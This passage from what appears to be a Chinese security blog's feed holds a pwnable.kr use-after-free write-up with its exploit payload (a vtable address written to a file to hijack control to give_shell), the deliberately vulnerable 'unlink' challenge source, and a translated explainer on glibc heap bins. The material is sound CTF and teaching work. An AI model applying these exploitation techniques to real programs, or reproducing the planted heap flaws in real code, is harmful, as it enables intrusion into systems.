class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序定义一个名为human的虚基类，之后定义了Man和Woman两个类继承这个类，并各自重写了父类的introduce()方法，主函数中，分别创建了一个Man和Woman的对象, 用户可以输入三个选项，分别为：</p>
<ol>
<li><p>use：Man和Woman分别调用introduce()方法，即使用指针指向的函数</p>
</li>
<li><p>after：分配一段地址空间存储main函数传递的数据，我们可以用其将已经被free的内存，重新allocate</p>
</li>
<li><p>free：delete释放掉创建的对象的空间，即将指针指向的内存释放</p>
<p>三者的组合即可构成UAF漏洞</p>
</li>
</ol>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="前置知识1：虚函数的内存地址空间"><a href="#前置知识1：虚函数的内存地址空间" class="headerlink" title="前置知识1：虚函数的内存地址空间"></a>前置知识1：虚函数的内存地址空间</h3><p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/3.png" class></strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> base; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类1，无虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child1</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::f1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child1::h1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child1; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类2，有1个虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child2</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::g2&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Child2::h2&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child2; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="单一继承，无虚函数重载"><a href="#单一继承，无虚函数重载" class="headerlink" title="单一继承，无虚函数重载"></a>单一继承，无虚函数重载</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/4.png" class></strong></p>
<h4 id="单一继承，重载了虚函数"><a href="#单一继承，重载了虚函数" class="headerlink" title="单一继承，重载了虚函数"></a>单一继承，重载了虚函数</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/5.png" class></strong></p>
<h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/6.png" class></strong></p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/7.png" class></strong></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。<strong>注意这并不是直接继承了私有(private)虚函数</strong></li>
<li>当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。</li>
<li>vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr</li>
</ul>
<h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use-After-Free"></a>Use-After-Free</h3><p><a href="https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88">Dangling pointer</a></p>
<p>Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。</p>
<h4 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h4><p>对Dangling pointer所指向内存进行use，如指针解引用等。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串）</p>
<h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> (*func)() <span class="comment">//函数指针，可以理解为类里面的方法</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>假设有上述这样的一个结构体指针p，在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为<strong>此时p指针指向的内存包含的内容已经改变</strong>。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/8.png" class></strong></p>
<h4 id="数据控制"><a href="#数据控制" class="headerlink" title="数据控制"></a><strong>数据控制</strong></h4><ul>
<li>任意地址读：$puts(p-&gt;name)—————&gt;puts(char*(addr2))$</li>
<li>任意地址写：$strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)$</li>
<li>控制流劫持：$p-&gt;func()———————&gt;call\  addr3$</li>
</ul>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="查看文件保护措施"><a href="#查看文件保护措施" class="headerlink" title="查看文件保护措施"></a>查看文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/9.png" class></strong></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。</p>
<p>基本思路为：将main函数创建的两个对象先free，但指针并没有被销毁，之后我们allocate同样的大小，可以得到原先被释放的内存，这样就得到一个可控的地址空间，并且这个空间中记录了之前vptr指针，这样可通过改写这个虚表指针的值，之后再利用use，即m-&gt;introduce()时，劫持程序执行流，将本来执行的introduce函数变成执行give_shell函数。注意main中输入2分配空间是读取传入的两个参数，第一个决定分配空间的大小，第二个是读入一个文件，将文件中的内容写入到刚刚分配的空间中，因此我们首先要取得之前释放的空间，为保证这一点，需要使得传递的参数和之前释放的空间大小相同，而且这里需要分配两次，因为是两个对象，之后文件中的内容需将之前的虚表指针的值覆盖成我们想要的值，因为每个对象空间中的第一项记录的就是vptr，所以直接向文件中写入改写的虚表指针的值即可(从头开始读入，否则中间还需要填充一些字段)。</p>
<h3 id="寻找vtable的地址"><a href="#寻找vtable的地址" class="headerlink" title="寻找vtable的地址"></a>寻找vtable的地址</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/10.png" class></strong></p>
<p>直接在将文件拖入IDA64中查看（当然这里也可以用gdb动态调试，从main函数一步步跟进）。因为vptr指向的是vtable中的第一项，由第一项存放的内容是函数give_shell的地址，找到give_shell的位置可以确定vptr的地址为$0x401570$，第二项，即vptr+8所指向的位置，存放的内容是子类重写的函数introduce的地址，main函数中输入1（use）会调用introduce函数，因此我们需要在调用introduce函数时，讲vptr的指针指向give_shell函数，即将指针向前移动8个字节长度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x401570</span> - <span class="number">8</span> = <span class="number">0x401568</span> -&gt; \x68\x15\x40\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>

<h3 id="确定每个对象分配的空间大小"><a href="#确定每个对象分配的空间大小" class="headerlink" title="确定每个对象分配的空间大小"></a>确定每个对象分配的空间大小</h3><p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/11.png" class></strong></p>
<p>可见原本分配的两个对象的空间为$0x18 = 24Byte$，所以之后分配的空间也同样为24字节。（这里没有必要手动计算类对象所占空间的大小，因为不同机器可能会存在差异，知道存在哪些项即可，不必过于纠结为什么是24字节。）</p>
<h3 id="整理如下"><a href="#整理如下" class="headerlink" title="整理如下"></a>整理如下</h3><ul>
<li>输入3（free）：将分配的man和woman的空间释放（这里先释放man，在释放woman）</li>
<li>输入2（allocate）：先将woman释放的空间重新拿回</li>
<li>输入2（allocate）：再将man释放的空间重新拿回</li>
<li>输入（use）：通过传递的参数已经改写了vptr的值，执行introduce即give_shell，拿到flag</li>
</ul>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;\x68\x15\x40\x00\x00\x00\x00\x00&#x27;&quot;</span> &gt; /tmp/<span class="built_in">exp</span>.txt</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/12.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink</title>
    <url>/xiaohong404.github.io/2020/10/24/Pwnable_kr/unlink/</url>
    <content><![CDATA[<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/24/Pwnable_kr/unlink/1.png" alt="image-20201024154417581"></p>
<h3 id="查看unlink-c源文件"><a href="#查看unlink-c源文件" class="headerlink" title="查看unlink.c源文件"></a>查看unlink.c源文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK=P-&gt;bk;</span><br><span class="line">        FD=P-&gt;fd;</span><br><span class="line">        FD-&gt;bk=BK;</span><br><span class="line">        BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">        OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">        OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">        A-&gt;fd = B;</span><br><span class="line">        B-&gt;bk = A;</span><br><span class="line">        B-&gt;fd = C;</span><br><span class="line">        C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">        <span class="comment">// heap overflow!</span></span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// exploit this unlink!</span></span><br><span class="line">        unlink(B);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap II</title>
    <url>/xiaohong404.github.io/2020/10/17/Heap/Heap-II/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/0.png" class></strong></p>
 <a id="more"></a>

<p>[<a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">原版传送门</a>]</p>
<h3 id="UNDERSTANDING-THE-GLIBC-HEAP-IMPLEMENTATION"><a href="#UNDERSTANDING-THE-GLIBC-HEAP-IMPLEMENTATION" class="headerlink" title="UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION"></a><strong>UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION</strong></h3><p>前一部分解释了<a href="https://linux.die.net/man/3/malloc"><em>malloc</em></a>和<a href="https://linux.die.net/man/3/free"><em>free</em></a>的基本行为。我们看到，<em>malloc</em>通过分配内存块来处理内存分配请求<em>。</em>每个块不仅存储程序员将与之交互的malloc返回的“用户数据”区域，还存储与该块关联的元数据。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/1.png" class></strong></p>
<p>我们看到了堆管理器的基本块分配策略是如何工作的，并且看到了当没有已经释放的块可以被用于响应用户的请求时，如何从堆的顶部创建新块。</p>
<p>接下来这篇文章，将解释这种块回收策略是如何工作的，即如何将已经分配的块被<em>free</em>然后保存起来，并最终回收以服务之后的<em>malloc</em>请求。许多堆利用技术都依赖于这些内部机制，但是现在，让我们看看堆正确运行时如何通过<em>free</em>回收这些块。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/2.gif" class></strong></p>
<h3 id="HOW-DOES-FREE-WORK"><a href="#HOW-DOES-FREE-WORK" class="headerlink" title="HOW DOES FREE WORK?"></a><strong>HOW DOES FREE WORK?</strong></h3><p>当程序员完成<em>malloc</em>的分配块的任务（或malloc兼容的分配，如<em>calloc</em>）后，程序员将通过<a href="https://linux.die.net/man/3/free"><em>free</em></a>将其释放回堆管理器。在<a href="http://www.open-std.org/JTC1/SC22/wg14/www/docs/n1124.pdf">C标准</a>定义了<em>free（NULL）</em>什么也不做，但对于所有其他<em>free</em>调用，堆管理器的第一份工作是使指针指回其相应的块。堆管理器通过从传递给free的指针中<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1172">减去该块元数据的大小来实现</a>此目的。</p>
<p>从指针到块的这种转换之所以有效，是因为用户数据区域位于块内，但是，仅当传递给free的指针确实来自<em>malloc</em>的实时分配时，该转换才有效。如果将其他一些指针传递给free，则堆管理器可能释放或回收无效的块，从而导致内存损坏问题，这可能导致进程崩溃，甚至可能使黑客远程接管该进程。</p>
<p>因此，<em>free</em>首先进行了一些基本的检查，检查是否这个释放的块是显然无效的，防止之后再分配。如果其中任何一个检查失败，则程序中止。检查包括：</p>
<ol>
<li>检查分配<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4182">是否</a>在8字节（或64位为16字节）边界上对齐，因为<em>malloc</em>确保所有分配都对齐。</li>
<li>检查块的大小字段是否可能，因为它可能<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4318">太小</a>，太大，或者没有对齐字节，还是因为它<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4175">与进程地址空间的末尾重叠</a>。</li>
<li>检查块位于<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4318">arena的边界内</a>。</li>
<li>通过检查位于下一个块开头的元数据中的相应“ P”位，检查该块是否<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4182">尚未标记为空闲</a>。</li>
</ol>
<p>这里的堆管理器检查并不详尽。攻击者控制的指向数据的指针可能会绕过这些完整性检查，并且仍会在进程中触发内存崩溃。我们将在以后的文章中更详细地介绍这一点。</p>
<h3 id="FREE-CHUNK-METADATA"><a href="#FREE-CHUNK-METADATA" class="headerlink" title="FREE CHUNK METADATA"></a><strong>FREE CHUNK METADATA</strong></h3><p>在上一篇文章中，展示了已分配块如何将元数据与程序员使用的“用户数据”区域一起存储。这些已经分配的块存储了“块大小”以及其元数据中的三个位，分别称为“ A”，“ M”和“ P”。这些位可分别帮助堆管理器记住该块是否是从非主arena分配的，是否是通过<em>mmap</em>进行堆外分配的，以及前一个块是否是空闲的。</p>
<p>空闲块也存储元数据。类似已分配的块，他们存储“块大小”，“A”和“P”字段，但他们不使用“M”字段，因为一个<a href="http://man7.org/linux/man-pages/man2/mmap.2.html">MMAP</a>过的块在释放期间将永远是<a href="https://linux.die.net/man/3/munmap"><em>munmap-</em></a>ed（取消虚拟内存映射），而不是转变成一个<em>free</em>块回收，即空闲块的”M“字段是一个确定的值，一定不会通过mmap从堆外分配。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/3.png" class></strong></p>
<p>空闲块还使用称为“<a href="http://g.oswego.edu/dl/html/malloc.html">边界标签</a>”的技术在用户数据区域之后存储信息。这些边界标签在块之前和之后携带大小信息。这允许从任何已知的块开始并在任何方向上遍历块，从而能够非常快速地合并相邻的空闲块。</p>
<p>这些释放的块存储在相应的<em>”free bins“</em>中，这些<em>“free bins”</em>用作<a href="https://en.wikipedia.org/wiki/Linked_list">链表</a>。这要求每个空闲块还存储指向其他块的指针。由于释放的块中的“用户数据”（根据定义）是免费供堆管理器使用的，因此堆管理器将释放的块中的“用户数据”区域重新定位为额外的元数据所在的位置。</p>
<h3 id="RECYCLING-MEMORY-WITH-BINS"><a href="#RECYCLING-MEMORY-WITH-BINS" class="headerlink" title="RECYCLING MEMORY WITH BINS"></a><strong>RECYCLING MEMORY WITH BINS</strong></h3><p>在内部，堆管理器需要记录释放的块，以便malloc可以在分配请求期间重用它们。在最初的实现中，堆管理器可以通过将所有释放的块简单地存储在某个巨大的链表中来完成此操作。这可以工作，但是会使<a href="https://linux.die.net/man/3/malloc"><em>malloc</em></a>变慢。由于<em>malloc</em>是大多数程序的高利用率组件，因此这种缓慢将对系统上运行的程序的整体性能产生巨大影响。</p>
<p>为了提高性能，堆管理器而是维护一系列称为“ bins”的列表，这些列表旨在最大程度地提高分配和释放的速度。共有5种类型<em>bins</em>：每个线程<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1407">62</a> <strong>small bins,</strong> 63 <strong>large bins,</strong> 1 <strong>unsorted bin,</strong> 10 <strong>fast bins</strong> and 64 <strong>tcache bins</strong> 。</p>
<p><em>small，large，unsorted bins</em>是最古老的bin类型，其实现这里将其称为堆的基本回收策略。fast bins和tcache bins是在这些基础上的优化。</p>
<p>容易混淆的地方在于，在堆管理器的源代码中，<em>small，large，unsorted bins</em>都一起存在<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1686">同一数组</a>中。索引0没有被使用，索引1是<em>unsorted bin</em>，2-64是<em>small bins</em>，65-127是<em>large bins</em>。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/4.png" class></strong></p>
<h3 id="CHUNK-RECYCLING-THE-BASIC-STRATEGY"><a href="#CHUNK-RECYCLING-THE-BASIC-STRATEGY" class="headerlink" title="CHUNK RECYCLING: THE BASIC STRATEGY"></a><strong>CHUNK RECYCLING: THE BASIC STRATEGY</strong></h3><p>在<em>tcache</em>和<em>fastbin</em>优化之前，首先来看一下堆管理器使用的基本回收策略。</p>
<p><em>free</em>的基本算法如下（低地址在前，高地址在后）：</p>
<ol>
<li><p>如果块在元数据中设置了<em>M</em>位，则分配是在堆外分配的，则应该被<a href="https://linux.die.net/man/3/munmap"><em>munmap</em></a>。</p>
</li>
<li><p>否则，如果该块之前的块是空闲的，则将之前的块向后合并以创建更大的空闲块。</p>
</li>
<li><p>同样，如果此块之后的块是空闲的，则将之后的块将向前合并以创建更大的空闲块。</p>
</li>
<li><p>如果这个之后可能更大的块与堆的“顶部”相邻，则整个块将被存储到堆的末端，而不是存储在“ bin”中。</p>
</li>
<li><p>否则，该块将被标记为空闲并将其放置在适当的bin中。</p>
</li>
</ol>
<h3 id="SMALL-BINS"><a href="#SMALL-BINS" class="headerlink" title="SMALL BINS"></a><strong>SMALL BINS</strong></h3><p><em>small bins</em>是最容易理解的基本bin。它们有62个，每个<em>small bin</em>都存储相同大小的固定块。在32位系统上小于512字节（在64位系统上小于1024字节）的每个块都有一个对应的<em>small bin</em>。由于每个<em>small bin</em>仅存储一个特定大小的块，它们会自动排序，因此在这些列表中插入和删除条目的速度非常快。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/5.png" class></strong></p>
<h3 id="LARGE-BINS"><a href="#LARGE-BINS" class="headerlink" title="LARGE BINS"></a><strong>LARGE BINS</strong></h3><p><em>small bins</em>的策略非常适合小型分配，但是我们无法为每个可能的块大小都设置一个存储区。对于超过512字节（64位为1024字节）的块，堆管理器将改为使用<em>large bins</em>。</p>
<p>63个<em>large bins</em>中的每个大都与<em>small bins</em>以相同的方式运行，但是它们不是存储固定大小的块，而是存储一定大小范围内的块。每个<em>large bins</em>的大小范围都设计为与<em>small bins</em>的块大小或其他<em>large bins</em>的范围不重叠。换句话说，在给定块的大小的情况下，恰好只有一个对应于此大小的<em>small bin</em>或<em>large bin</em>。</p>
<p>由于<em>large bins</em>存储一定大小范围的块，因此向<em>large bin</em>中插入一个块必须手动进行排序，并且从链表中的分配也需要遍历该列表。这使得<em>large bins</em>本质上比<em>small bins</em>慢。但是，在大多数程序中，<em>large bins</em>的使用频率较低。这是因为平均意义上说，程序更倾向于以更高的频率分配（或释放）小的分配块。出于相同的原因，<em>large bins</em>的使用频率会聚集在覆盖范围较小的<em>large bin</em>中；最小的<em>large bin</em>仅覆盖从512字节到576字节的64字节范围的块，而第二大的<em>large bin</em>则覆盖256KB的大小范围的块。最大的<em>large bin</em>覆盖了<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1394">1MB以上</a>的所有已释放块。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/6.png" class></strong></p>
<h3 id="UNSORTED-BIN"><a href="#UNSORTED-BIN" class="headerlink" title="UNSORTED BIN"></a><strong>UNSORTED BIN</strong></h3><p>堆管理器使用称为<em>unsorted bins</em>的优化缓存层面进一步改善了基本的分配算法。此优化基于以下观察结果：通常这些free的块都聚集在一起，并且释放后通常立即分配大小相似的块。例如，释放树或列表的程序通常会一次释放大多数分配空间中的所有条目，或者更新列表中条目的程序可能会释放前一个条目，然后再分配新的空间替换条目。</p>
<p>在这些情况下，在将较大的块放入正确的bin中之前合并这些释放的块将避免一些开销，并且在分配过程中能够快速返回最近释放的块将简单地加快整个过程。</p>
